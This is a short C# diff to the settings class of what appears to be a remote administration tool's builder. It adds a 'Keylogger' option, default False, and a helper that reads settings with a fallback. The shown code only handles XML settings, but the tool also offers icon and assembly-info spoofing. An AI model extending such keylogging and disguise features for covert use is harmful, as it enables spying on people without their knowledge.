@@ -39,6 +39,7 @@ namespace xServer.Settings
                     root.AppendChild(doc.CreateElement("AdminElevation")).InnerText = "False";
                     root.AppendChild(doc.CreateElement("ChangeIcon")).InnerText = "False";
                     root.AppendChild(doc.CreateElement("ChangeAsmInfo")).InnerText = "False";
+                    root.AppendChild(doc.CreateElement("Keylogger")).InnerText = "False";
                     root.AppendChild(doc.CreateElement("ProductName"));
                     root.AppendChild(doc.CreateElement("Description"));
                     root.AppendChild(doc.CreateElement("CompanyName"));
@@ -76,6 +77,12 @@ namespace xServer.Settings
             {
                 return string.Empty;
             }
+        }
+
+        public string ReadValueSafe(string pstrValueToRead, string defaultValue = "")
+        {
+            string value = ReadValue(pstrValueToRead);
+            return (!string.IsNullOrEmpty(value)) ? value : defaultValue;
         }
 
         public bool WriteValue(string pstrValueToRead, string pstrValueToWrite)
